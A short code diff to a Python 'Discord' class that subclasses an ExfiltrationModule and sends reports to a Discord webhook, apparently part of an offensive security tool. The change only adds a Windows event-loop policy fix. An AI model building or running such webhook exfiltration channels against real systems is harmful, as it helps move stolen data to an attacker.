@@ -4,6 +4,7 @@
 __author__ = "EONRaider @ keybase.io/eonraider"
 
 import asyncio
+import platform
 from io import BufferedReader
 from typing import Iterator
 
@@ -26,6 +27,10 @@ class Discord(ExfiltrationModule):
         super().__init__(module)
         self.webhook_url = webhook_url
         self._username = self.module.__class__.__name__
+        if platform.system() == "Windows":
+            # Prevent RuntimeError exception on Windows
+            asyncio.set_event_loop_policy(
+                asyncio.WindowsSelectorEventLoopPolicy())
 
     def update(self, message: [str, None]) -> None:
         """Send each report as a new message to a Discord server with a
